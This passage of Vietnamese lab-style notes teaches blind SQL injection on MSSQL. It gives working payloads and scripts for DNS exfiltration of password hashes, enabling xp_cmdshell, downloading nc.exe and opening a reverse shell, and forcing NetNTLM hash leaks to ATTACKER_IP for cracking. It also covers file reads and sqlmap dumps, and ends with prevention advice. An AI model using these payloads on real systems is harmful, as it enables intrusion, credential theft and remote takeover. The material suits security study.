db_name_length = dumpNumber("LEN(DB_NAME())")
print(f"Độ dài tên cơ sở dữ liệu: {db_name_length}")
```

**Trích xuất tên cơ sở dữ liệu:**
```python
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):  # Duyệt qua từng ký tự
        c = 0
        for p in range(7):  # Duyệt qua từng bit của ký tự
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

db_name = dumpString("DB_NAME()", db_name_length)
print(f"Tên cơ sở dữ liệu: {db_name}")
```

#### **Kết quả:**
```plaintext
Độ dài tên cơ sở dữ liệu: 8
Tên cơ sở dữ liệu: digcraft
```

---

### **2. Liệt kê các bảng (Tables)**

#### **Ý tưởng:**
1. Dùng **`SELECT COUNT(*) FROM information_schema.tables`** để tìm số lượng bảng.
2. Trích xuất tên từng bảng sử dụng **`table_name`** trong **`information_schema.tables`**.

#### **Triển khai:**

**Xác định số lượng bảng:**
```python
num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft'")
print(f"Số bảng: {num_tables}")
```

**Trích xuất tên từng bảng:**
```python
for i in range(num_tables):
    table_name_length = dumpNumber(f"SELECT LEN(table_name) FROM information_schema.tables WHERE table_catalog='digcraft' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    table_name = dumpString(f"SELECT table_name FROM information_schema.tables WHERE table_catalog='digcraft' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", table_name_length)
    print(f"Tên bảng {i+1}: {table_name}")
```

#### **Kết quả:**
```plaintext
Số bảng: 2
Tên bảng 1: flag
Tên bảng 2: userAgents
```

---

### **3. Liệt kê các cột (Columns)**

#### **Ý tưởng:**
1. Dùng **`SELECT COUNT(column_name)`** để xác định số lượng cột trong bảng.
2. Trích xuất tên từng cột từ **`INFORMATION_SCHEMA.COLUMNS`**.

#### **Triển khai:**

**Xác định số lượng cột:**
```python
num_columns = dumpNumber("SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='flag' AND table_catalog='digcraft'")
print(f"Số cột trong bảng 'flag': {num_columns}")
```

**Trích xuất tên từng cột:**
```python
for i in range(num_columns):
    column_name_length = dumpNumber(f"SELECT LEN(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='flag' AND table_catalog='digcraft' ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    column_name = dumpString(f"SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='flag' AND table_catalog='digcraft' ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", column_name_length)
    print(f"Tên cột {i+1} trong bảng 'flag': {column_name}")
```

#### **Kết quả:**
```plaintext
Số cột trong bảng 'flag': 1
Tên cột 1: flag
```

---

### **4. Trích xuất giá trị từ bảng (Dumping Data)**

#### **Ý tưởng:**
1. Dùng **`COUNT(*)`** để xác định số dòng trong bảng.
2. Trích xuất từng giá trị từ bảng **`flag`** sử dụng truy vấn **`SELECT`**.

#### **Triển khai:**

**Xác định số lượng dòng trong bảng:**
```python
num_rows = dumpNumber("SELECT COUNT(*) FROM flag")
print(f"Số dòng trong bảng 'flag': {num_rows}")
```

**Trích xuất giá trị từng dòng:**
```python
for i in range(num_rows):
    flag_value_length = dumpNumber(f"SELECT LEN(flag) FROM flag ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    flag_value = dumpString(f"SELECT flag FROM flag ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", flag_value_length)
    print(f"Dòng {i+1} trong bảng 'flag': {flag_value}")
```

#### **Kết quả:**
```plaintext
Số dòng trong bảng 'flag': 1
Dòng 1 trong bảng 'flag': FLAG_VALUE
```

---

# 10. Khai thác dữ liệu qua DNS Out-of-Band (OOB) Injection

---

### **Lý thuyết**

- **DNS Exfiltration:** Cho phép trích xuất dữ liệu bằng cách làm máy chủ mục tiêu gửi yêu cầu DNS tới máy chủ DNS mà bạn kiểm soát. Dữ liệu được mã hóa và gắn vào tên miền phụ (subdomain).
- **Ứng dụng:** Hữu ích trong các tấn công **Blind SQL Injection** khi không có phản hồi trực tiếp hoặc thời gian chờ không đáng tin cậy.

#### **Quy trình chung:**
1. Dùng payload SQL để mã hóa dữ liệu thành dạng tuân thủ DNS (ví dụ: hex hoặc base64).
2. Tách dữ liệu thành các phần nhỏ hơn (<63 ký tự) để phù hợp với giới hạn của DNS.
3. Gửi các phần dữ liệu qua subdomain tới máy chủ DNS bạn kiểm soát.
4. Thu thập dữ liệu từ log của máy chủ DNS và giải mã.

---

### **1. Thiết lập môi trường**
Bạn cần:
1. **Tên miền do bạn kiểm soát** (hoặc sử dụng công cụ như **Interact.sh** hoặc **Burp Collaborator** để nhận DNS log).
2. **Máy chủ DNS tùy chỉnh** nếu tấn công trên mạng nội bộ.

---

### **2. Payload cơ bản cho DNS Exfiltration**

#### **Mục tiêu:** Trích xuất giá trị từ cơ sở dữ liệu.

#### **Cấu trúc payload:**
- **SQL Payload mẫu:**
```sql
DECLARE @T VARCHAR(MAX);
SELECT @T=(SELECT password FROM users WHERE username='maria');
EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\"');
```

- **Với mã hóa Hex:** Đảm bảo dữ liệu tuân thủ quy tắc DNS.
```sql
DECLARE @T VARCHAR(MAX), @A VARCHAR(63), @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) FROM users WHERE username='maria';
SELECT @A=SUBSTRING(@T,3,63), @B=SUBSTRING(@T,66,63);
EXEC('master..xp_dirtree "\\'+@A+'.'+@B+'.YOUR.DOMAIN\"');
```

---

### **3. Triển khai với DNS Exfiltration**

#### **Ví dụ Payload:**
- Trích xuất hash mật khẩu của người dùng **Maria**.
```sql
maria';DECLARE @T VARCHAR(MAX), @A VARCHAR(63), @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) FROM users WHERE username='maria';
SELECT @A=SUBSTRING(@T,3,63), @B=SUBSTRING(@T,66,63);
EXEC('master..xp_dirtree "\\'+@A+'.'+@B+'.blindsqli.academy.htb\"');--
```

---

### **4. Thu thập dữ liệu từ DNS Logs**

1. **Sử dụng công cụ DNS:**
   - **Interact.sh:** Truy cập [Interact.sh](https://app.interactsh.com) để nhận tên miền tạm thời và theo dõi các yêu cầu DNS.
   - **Burp Collaborator:** Sử dụng nếu có **Burp Suite Pro** để theo dõi tương tác OOB.

2. **Hoặc tự triển khai DNS server:**
   - Thiết lập máy chủ DNS tùy chỉnh trên mạng nội bộ hoặc sử dụng tên miền với máy chủ DNS của bạn.
   - Theo dõi log của DNS server để lấy dữ liệu bị trích xuất.

---

### **5. Tự động hóa với Python**

#### **Tự động gửi payload:**
```python
import requests

# Thay YOUR.DOMAIN bằng tên miền bạn kiểm soát
DOMAIN = "blindsqli.academy.htb"

# Hàm gửi payload qua HTTP header
def send_payload(payload):
    headers = {
        "User-Agent": payload
    }
    url = "http://target-website.com"
    requests.get(url, headers=headers)

# Payload SQL
payload = """maria';DECLARE @T VARCHAR(MAX), @A VARCHAR(63), @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) FROM users WHERE username='maria';
SELECT @A=SUBSTRING(@T,3,63), @B=SUBSTRING(@T,66,63);
EXEC('master..xp_dirtree "\\'+@A+'.'+@B+'.%s\"');--""" % DOMAIN

# Gửi payload
send_payload(payload)
```

---

### **6. Giải mã dữ liệu từ log DNS**

- **Dữ liệu trong log:** 
  ```
  736563726574.6578616d706c65.blindsqli.academy.htb
  ```

- **Giải mã bằng Python:**
```python
# Dữ liệu bị trích xuất
encoded_data = "7365637265746578616d706c65"

# Chuyển đổi từ hex sang string
decoded_data = bytes.fromhex(encoded_data).decode('utf-8')
print(f"Dữ liệu giải mã: {decoded_data}")
```

---

### **7. Tối ưu hóa kịch bản**

#### **Tự động hóa toàn bộ quy trình:**
- Kết hợp các bước:
  1. **Tách dữ liệu lớn thành nhiều subdomain.**
  2. **Gửi từng phần dữ liệu qua DNS.**
  3. **Giải mã và hợp nhất dữ liệu.**

#### **Ví dụ:**
```python
def split_and_send(data):
    subdomains = [data[i:i+63] for i in range(0, len(data), 63)]
    for subdomain in subdomains:
        payload = f"maria';DECLARE @T='{subdomain}';EXEC('master..xp_dirtree \"\\'+@T+'.YOUR.DOMAIN\"');--"
        send_payload(payload)
```

---


# 11. Remote Code Execution qua SQL Injection (MSSQL)

---

### **Tổng quan**
Khai thác lỗ hổng **SQL Injection** để kích hoạt **Remote Code Execution (RCE)** thông qua MSSQL. Mục tiêu cuối cùng là:
1. Kích hoạt **xp_cmdshell**.
2. Thực thi lệnh để kiểm tra quyền.
3. Thiết lập reverse shell.

---

### **1. Kiểm tra quyền sysadmin**

#### **Mục tiêu:**
Xác định xem tài khoản có quyền **sysadmin** hay không.

#### **Payload:**
```sql
maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--
```

- **Kết quả:**
  - **`taken`** → Tài khoản có quyền sysadmin.
  - **`available`** → Tài khoản không có quyền sysadmin.

---

### **2. Kích hoạt xp_cmdshell**

#### **Mục tiêu:**
Bật **xp_cmdshell** (mặc định bị tắt).

#### **Quy trình:**
1. Bật **show advanced options**:
   ```sql
   ';exec sp_configure 'show advanced options','1';reconfigure;--
   ```

2. Bật **xp_cmdshell**:
   ```sql
   ';exec sp_configure 'xp_cmdshell','1';reconfigure;--
   ```

3. Kiểm tra hoạt động của **xp_cmdshell**:
   ```sql
   ';exec xp_cmdshell 'ping /n 4 192.168.43.164';--
   ```

- **Kết quả:**
  - Nếu thấy các gói **ICMP request/reply** trong **tcpdump**, **xp_cmdshell** đã được kích hoạt thành công.

---

### **3. Thiết lập Reverse Shell**

#### **Mục tiêu:**
Thiết lập một kết nối ngược (reverse shell) từ máy chủ đến máy tấn công.

#### **Quy trình:**

1. **Tải xuống `nc.exe` trên máy chủ mục tiêu:**
   - **Payload tải xuống:**
     ```powershell
     (new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe");
     ```
   - **Encode payload bằng UTF-16LE và Base64:**
     ```bash
     python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe");""").encode("utf-16-le")).decode())'
     ```
   - **Output mã hóa:**
     ```plaintext
     KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAMwAuADEANgA0AC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsA
     ```

2. **Thực thi lệnh tải xuống `nc.exe`:**
   ```sql
   exec xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdw...'
   ```

3. **Kết nối reverse shell:**
   - **Payload thiết lập kết nối:**
     ```powershell
     c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe
     ```
   - **Encode payload tương tự như trên.**
   - **Thực thi qua xp_cmdshell:**
     ```sql
     exec xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdw...'
     ```

4. **Thiết lập môi trường tấn công:**
   - **Chạy HTTP server để phục vụ `nc.exe`:**
     ```bash
     python3 -m http.server 80
     ```
   - **Khởi động listener trên port 9999:**
     ```bash
     nc -nvlp 9999
     ```

---

### **4. Kết quả**

- **Kết nối thành công:**
  ```plaintext
  Ncat: Version 7.93 ( https://nmap.org/ncat )
  Ncat: Listening on :::9999
  Ncat: Listening on 0.0.0.0:9999
  Ncat: Connection from 192.168.43.156.
  Microsoft Windows [Version 10.0.19043.1826]
  C:\Windows\system32>
  ```

- Bạn có thể thực hiện các lệnh trực tiếp trên shell này.

---

### **Lưu ý**

1. **Phòng tránh lỗi:**
   - Đảm bảo URL tải `nc.exe` hợp lệ.
   - Kiểm tra firewall trên máy mục tiêu nếu không thể kết nối.
   - Sử dụng port không bị chặn (9999 là ví dụ).

2. **Tăng cường bảo mật:**
   - Sử dụng kết nối mã hóa như SSH hoặc HTTPS để tránh bị phát hiện.

---


# 12. Khai thác NetNTLM Hash qua SQL Injection

---

### **Tổng quan**

**NetNTLM hash** là dữ liệu xác thực Windows được gửi qua giao thức SMB khi một máy chủ cố gắng truy cập chia sẻ mạng. Lợi dụng điều này, chúng ta có thể:
1. **Buộc SQL Server gửi hash** tới một SMB server mà chúng ta kiểm soát.
2. **Thu thập NetNTLM hash** từ SMB server.
3. **Crack hash** để lấy mật khẩu.

---

### **1. Thiết lập môi trường**

#### **Tải và cài đặt Responder**
Responder là công cụ phổ biến để bắt NetNTLM hash.
```bash
git clone https://github.com/lgandx/Responder
cd Responder
sudo python3 Responder.py -I eth0
```

- Đảm bảo **SMB server** được bật trong `Responder.conf`:
  - Mở tệp `Responder.conf`.
  - Đổi dòng `SMB = Off` thành `SMB = On`.

#### **Khởi chạy Responder**
```bash
sudo python3 Responder.py -I eth0
```
- Responder sẽ lắng nghe trên giao diện mạng **eth0** để chờ yêu cầu SMB.

---

### **2. Tạo SQL Payload**

#### **Payload để kích hoạt truy cập SMB:**
```sql
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
```

- **Mục tiêu:**
  - Buộc SQL Server truy cập chia sẻ SMB `\\<ATTACKER_IP>\myshare`.
  - NetNTLM hash sẽ được gửi đến **ATTACKER_IP**.

#### **Thực thi Payload:**
Gửi payload qua lỗ hổng SQL Injection:
```http
User-Agent: ';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
```

---

### **3. Thu thập NetNTLM Hash**

#### **Quan sát Responder Logs:**
Sau khi payload chạy thành công, Responder sẽ ghi lại hash trong log:
```plaintext
[SMB] NTLMv2-SSP Client   : 192.168.43.156
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash     : jason::SQL01:bd7f162c24a39a0f:94DF80C5ABBA<SNIP>000000000
```

- **Username:** `SQL01\jason`
- **Hash:** `bd7f162c24a39a0f:94DF80C5ABBA<SNIP>000000000`

---

### **4. Crack NetNTLM Hash**

#### **Sử dụng Hashcat để crack:**
- **Cấu trúc lệnh:**
  ```bash
  hashcat -m 5600 <hash> <wordlist>
  ```

- **Ví dụ:**
  ```bash
  hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB<SNIP>000000' /usr/share/wordlists/rockyou.txt
  ```

- **Kết quả:**
  ```plaintext
  Status...........: Cracked
  Hash.Mode........: 5600 (NetNTLMv2)
  Hash.Target......: jason::SQL01:bd7f162c24a39a0f:94df80c5abb...000000
  Password.........: MyPassword123
  ```

---

### **5. Mở rộng**

#### **Sử dụng mật khẩu để leo thang đặc quyền**
- Sử dụng mật khẩu vừa crack được để:
  - **Truy cập SMB:** Dùng `smbclient` để kiểm tra chia sẻ SMB.
  - **RDP:** Kiểm tra quyền đăng nhập từ xa qua RDP.
  - **Khai thác MSSQL thêm:** Sử dụng quyền mới để chạy lệnh hoặc tấn công sâu hơn.

#### **Phòng chống**
- **Vô hiệu hóa xp_cmdshell** nếu không cần thiết.
- **Giới hạn quyền sysadmin** trên tài khoản MSSQL.
- **Bảo mật SMB:** Sử dụng SMBv2/v3 và chặn giao thức SMB cũ (SMBv1).

---


# 13. Lỗi Đọc File qua SQL Injection

**Lý thuyết:**
Trong ví dụ này, chúng ta khai thác lỗi SQL injection để đọc các file từ hệ thống file của server. Cụ thể, chúng ta sử dụng hàm `OPENROWSET` trong Microsoft SQL Server để đọc các file trực tiếp từ hệ thống file của server. Điều này có thể thực hiện được nếu lỗi SQL injection cho phép chúng ta thực thi các lệnh SQL và có đủ quyền hạn.

Hàm `OPENROWSET` cho phép tương tác với hệ thống file của server và đọc nội dung của các file theo dạng bulk (dữ liệu lớn). Cú pháp phổ biến để đọc một file thông qua `OPENROWSET` như sau:

```sql
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

- `SINGLE_CLOB` lưu trữ dữ liệu dưới dạng `varchar`.
- `SINGLE_BLOB` lưu trữ dữ liệu dưới dạng `varbinary`.
- `SINGLE_NCLOB` lưu trữ dữ liệu dưới dạng `nvarchar`.

Điều này cho phép chúng ta đọc nội dung của các file và có thể trích xuất thông tin nhạy cảm, chẳng hạn như các file hệ thống, dữ liệu ứng dụng hoặc dữ liệu người dùng, tùy thuộc vào quyền hạn mà chúng ta có trên server.

**Kiểm Tra Quyền Hạn:**
Không phải tất cả người dùng đều có quyền sử dụng `OPENROWSET` với các thao tác bulk. Để thực hiện các thao tác bulk, chúng ta cần các quyền đặc biệt như:

- `ADMINISTER BULK OPERATIONS`
- `ADMINISTER DATABASE BULK OPERATIONS`

Để kiểm tra xem người dùng có quyền này hay không, chúng ta có thể chạy câu truy vấn SQL sau:

```sql
SELECT COUNT(*) 
FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
   OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```

Nếu kết quả trả về lớn hơn `0`, có nghĩa là chúng ta có quyền cần thiết để thực hiện các thao tác bulk.

Trong trường hợp SQL injection, bạn có thể chèn câu kiểm tra này vào một trường đầu vào dễ bị tấn công, như sau:

```sql
maria' AND (SELECT COUNT(*) 
FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
   OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS') > 0;--
```

**SQL Injection Dạng Boolean-based:**
Nếu lỗi SQL injection là dạng blind (không thể nhìn thấy kết quả trực tiếp), chúng ta có thể khai thác để đọc độ dài của một file và nội dung của nó theo từng ký tự bằng cách sử dụng kỹ thuật tìm kiếm nhị phân.

- **Bước 1: Lấy độ dài của file.**

Câu truy vấn để lấy độ dài của nội dung file sẽ là:

```sql
SELECT LEN(BulkColumn) 
FROM OPENROWSET(BULK '<file_path>', SINGLE_CLOB) AS x
```

Chúng ta có thể sử dụng vòng lặp sau để xác định độ dài của file bằng cách gửi các câu truy vấn và điều chỉnh biến `length` cho đến khi truy vấn trả về đúng độ dài file:

```python
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
    length += 1
print(f"[*] File length = {length}")
```

- **Bước 2: Dump nội dung file.**

Khi đã biết độ dài của file, chúng ta có thể dump (trích xuất) nội dung file theo từng ký tự. Để lấy từng ký tự, chúng ta sử dụng tìm kiếm nhị phân để đoán giá trị ASCII của nó bằng cách điều chỉnh các giới hạn `low` và `high`:

```python
print("[*] File = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) 
                   FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) 
                   BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end='')
sys.stdout.flush()
print()
```

Điều này sẽ in ra nội dung của file từng ký tự một.

**Ví Dụ Khi Chạy:**

Khi bạn chạy script Python trên (giả sử bạn có quyền SQL injection và quyền cần thiết), kết quả sẽ giống như sau:

```bash
[*] File length = 37
[*] File = Đây là nội dung của file
```

Quá trình này có thể mất một khoảng thời gian vì mỗi ký tự được đọc lần lượt, và tìm kiếm nhị phân cần thời gian cho mỗi ký tự.

---

# 14. Công Cụ SQLMap

**SQLMap** là một công cụ kiểm thử xâm nhập mã nguồn mở rất phổ biến, được tự động hóa để phát hiện và khai thác các lỗi SQL injection trên nhiều loại cơ sở dữ liệu, bao gồm MSSQL.

### Cài Đặt SQLMap
SQLMap là một công cụ được viết bằng Python và có thể chạy trên các hệ điều hành như Windows, Linux, hoặc macOS. Công cụ này thường được cài sẵn trên một số hệ điều hành Linux, chẳng hạn như Kali Linux hoặc ParrotOS.

Để cài đặt SQLMap, bạn chỉ cần thực hiện các bước sau:
1. Tải phiên bản mới nhất từ trang GitHub releases.
2. Giải nén tập tin tải về.
3. Vào thư mục chứa SQLMap và chạy lệnh:
   ```bash
   python3 sqlmap.py
   ```

### Ví Dụ: Tấn Công SQL Injection Dạng Boolean Blind trên **Aunt Maria's Donuts**
Để minh họa cách sử dụng SQLMap, chúng ta sẽ thực hiện tấn công SQL injection dạng Boolean-based blind trên trang web **Aunt Maria's Donuts**. Chúng ta sẽ chạy SQLMap đối với endpoint mà chúng ta nghi ngờ là có lỗ hổng SQL injection.

#### Bước 1: Kiểm Tra Lỗ Hổng SQL Injection
Giả sử chúng ta nghi ngờ rằng tham số `u` trong URL `http://localhost/api/check-username.php?u=maria` có thể bị SQL injection. Chúng ta sẽ chạy SQLMap để kiểm tra:

```bash
python .\sqlmap.py -u http://localhost/api/check-username.php?u=maria -batch
```

**Kết quả:**
SQLMap sẽ kiểm tra và xác nhận rằng tham số `u` bị lỗi SQL injection dạng Boolean-based blind. Đây là một kỹ thuật tấn công trong đó kẻ tấn công không thể thấy trực tiếp kết quả, nhưng có thể xác định được thông qua phản hồi đúng/sai của server.

#### Bước 2: Liệt Kê Các Cơ Sở Dữ Liệu
Khi đã xác định được rằng có một điểm tấn công SQLi, chúng ta có thể sử dụng SQLMap để liệt kê các cơ sở dữ liệu trong hệ thống bằng cách thêm cờ `--dbs`:

```bash
python .\sqlmap.py -u http://localhost/api/check-username.php?u=maria -batch --dbs
```

**Kết quả:**
SQLMap sẽ trả về danh sách các cơ sở dữ liệu có trên server:

```
available databases [5]:
[*] amdonuts
[*] master
[*] model
[*] msdb
[*] tempdb
```

Ở đây, cơ sở dữ liệu **amdonuts** là quan trọng nhất vì nó có thể chứa các thông tin liên quan đến ứng dụng.

#### Bước 3: Liệt Kê Các Bảng Trong Cơ Sở Dữ Liệu **amdonuts**
Chúng ta sẽ sử dụng SQLMap để liệt kê các bảng trong cơ sở dữ liệu `amdonuts`:

```bash
python .\sqlmap.py -u http://localhost/api/check-username.php?u=maria -batch -D amdonuts --tables
```

**Kết quả:**
Chúng ta thấy rằng chỉ có một bảng duy nhất trong cơ sở dữ liệu này là bảng `users`.

```
Database: amdonuts
[1 table]
+-------+
| users |
+-------+
```

#### Bước 4: Dump Dữ Liệu Của Bảng **users**
Tiếp theo, chúng ta sẽ dump (trích xuất) toàn bộ dữ liệu của bảng `users`:

```bash
python .\sqlmap.py -u http://localhost/api/check-username.php?u=maria -D amdonuts -T users --dump
```

**Kết quả:**
SQLMap sẽ trích xuất dữ liệu từ bảng `users` và in ra các bản ghi trong bảng này:

```
Database: amdonuts
Table: users
[3 entries]
+----------------------------------+----------+
| password                          | username |
+----------------------------------+----------+
| ...SNIP...                        | maria    |
| ...SNIP...                        | admin    |
| ...SNIP...                        | bmdyy    |
+----------------------------------+----------+
```

Dữ liệu bảng `users` đã được dump thành công. Nếu các giá trị trong cột `password` là hash, SQLMap sẽ hỏi bạn có muốn lưu các giá trị hash để giải mã sau không. Trong trường hợp này, chúng ta chọn không giải mã (N).

**Lưu Ý:**
Kết quả dump dữ liệu sẽ được lưu trong một file CSV trên máy tính của bạn tại đường dẫn sau:
```
'C:\Users\bill\AppData\Local\sqlmap\output\localhost\dump\amdonuts\users.csv'
```

---

# 15. Ngăn Chặn Các Lỗ Hổng SQL Injection

SQL injection (SQLi) xảy ra khi lập trình viên tạo các truy vấn động mà không kiểm tra hoặc làm sạch đầu vào của người dùng đúng cách. Để ngăn chặn lỗ hổng SQLi, bạn cần chú trọng vào hai phương pháp chính: **Kiểm Tra và Làm Sạch Dữ Liệu Đầu Vào** và **Sử Dụng Truy Vấn Có Tham Số (Parameterized Queries)**.

---

### 1. Kiểm Tra và Làm Sạch Dữ Liệu Đầu Vào

SQL injection xảy ra khi dữ liệu từ người dùng được kết hợp trực tiếp vào trong truy vấn SQL mà không được kiểm tra hoặc làm sạch. Bạn (với tư cách là lập trình viên) nên luôn làm sạch dữ liệu đầu vào và nếu dữ liệu đó có một định dạng nhất định (ví dụ: email, số điện thoại), bạn nên kiểm tra tính hợp lệ của nó.

#### Cách Làm:
- **Xử lý tất cả đầu vào từ người dùng như thể chúng có thể chứa mã độc**.
- **Kiểm tra định dạng của dữ liệu đầu vào**: Đối với những đầu vào như email, số điện thoại, bạn nên kiểm tra định dạng của chúng để đảm bảo chúng hợp lệ trước khi đưa vào trong truy vấn.

---

### 2. Sử Dụng Truy Vấn Có Tham Số (Parameterized Queries)

Sử dụng **truy vấn có tham số** là một cách rất hiệu quả để ngăn ngừa lỗ hổng SQL injection, bởi vì khi sử dụng phương pháp này, bạn truyền câu lệnh SQL và các tham số riêng biệt. Điều này giúp máy chủ phân biệt được đâu là mã lệnh SQL và đâu là dữ liệu người dùng, bất kể đầu vào của người dùng có thể chứa mã độc.

#### Ví Dụ Về Truy Vấn SQL Dễ Tổn Thương:
```php
$sql = "SELECT email FROM accounts WHERE username = '" . $_POST['username'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);
sqlsrv_free_stmt($stmt);
```
Truy vấn trên dễ bị tấn công SQLi vì tham số `$_POST['username']` được kết hợp trực tiếp vào câu lệnh SQL mà không qua kiểm tra.

#### Truy Vấn SQL Được Bảo Vệ Bằng Tham Số:
```php
$sql = "SELECT email FROM accounts WHERE username = ?";
$stmt = sqlsrv_query($conn, $sql, array($_POST['username']));
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);
sqlsrv_free_stmt($stmt);
```
Với cách viết này, `$_POST['username']` sẽ được xử lý như một tham số, không bị gộp chung vào câu lệnh SQL, do đó bảo vệ ứng dụng khỏi SQL injection.

---

### 3. Kiểm Tra và Làm Sạch Dữ Liệu Đầu Ra

Ngay cả khi bạn đã kiểm tra và làm sạch dữ liệu đầu vào, bạn vẫn cần phải áp dụng các biện pháp làm sạch khi xuất dữ liệu ra ngoài (ví dụ: khi hiển thị dữ liệu người dùng trên giao diện web). Điều này giúp ngăn chặn các cuộc tấn công SQL ở cấp độ thứ hai, nơi mã độc có thể được thực thi khi dữ liệu người dùng được hiển thị mà không qua xử lý.

---

### 4. Các Biện Pháp Cụ Thể Đối Với MSSQL

Đối với **MSSQL**, có một số biện pháp đặc biệt bạn có thể áp dụng để ngăn chặn các cuộc tấn công SQL injection.

#### Đừng Chạy Truy Vấn Với Quyền Sysadmin

Một trong những biện pháp quan trọng nhất là **không chạy truy vấn với quyền Sysadmin**. Cần sử dụng tài khoản có quyền hạn tối thiểu. Các quyền thừa có thể bị kẻ tấn công lợi dụng khi phát hiện được lỗ hổng SQL injection.

Ví dụ, tài khoản **sa** (tài khoản hệ thống cao nhất) không nên được sử dụng trong các truy vấn của ứng dụng web.

#### Tắt Các Chức Năng Nguy Hiểm

Một cách khác để bảo vệ MSSQL là **tắt các chức năng nguy hiểm** mà người dùng không cần thiết phải sử dụng. Chẳng hạn, chức năng `xp_dirtree` có thể bị kẻ tấn công sử dụng để rò rỉ thông tin như NetNTLM hashes. Nếu ứng dụng của bạn không cần sử dụng các chức năng này, bạn có thể tắt chúng cho người dùng mà ứng dụng sử dụng để truy vấn cơ sở dữ liệu.

Ví dụ, để thu hồi quyền thực thi đối với `xp_dirtree`, bạn có thể chạy lệnh sau:

```sql
REVOKE EXECUTE ON xp_dirtree TO public
```

Lưu ý: Mặc dù có thể tắt các chức năng như `xp_dirtree`, nhưng bạn không nên tắt tất cả các chức năng này, vì máy chủ SQL có thể cần sử dụng chúng trong quá trình hoạt động bình thường.

---

### Tổng Kết

SQL injection có thể gây ra những thiệt hại nghiêm trọng cho ứng dụng của bạn. Tuy nhiên, bằng cách áp dụng các biện pháp bảo vệ như kiểm tra và làm sạch dữ liệu đầu vào, sử dụng truy vấn có tham số, và kiểm tra đầu ra, bạn có thể giảm thiểu nguy cơ này. Đối với MSSQL, các biện pháp bổ sung như không sử dụng quyền Sysadmin và tắt các chức năng nguy hiểm cũng giúp bảo vệ hệ thống khỏi các cuộc tấn công SQLi.
